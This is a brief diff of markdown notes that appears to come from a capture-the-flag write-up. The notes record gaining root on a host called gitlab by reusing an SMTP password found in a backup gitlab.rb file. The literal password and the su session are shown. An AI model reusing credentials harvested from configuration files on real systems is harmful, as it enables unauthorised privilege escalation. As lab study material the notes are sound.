@@ -1,4 +1,5 @@
-# Got root@gitlab shell
+# Privileged shell
+## Got root@gitlab
 Got root@gitlab using `/opt/backup/gitlab.rb:gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"` as password
 ```bash
 git@gitlab:/tmp$ su root
@@ -13,3 +14,6 @@ whoami
 root
 root@gitlab:/tmp#
 ```
+## Got user.txt flag
+![[Pasted image 20210412061453.png]]
+
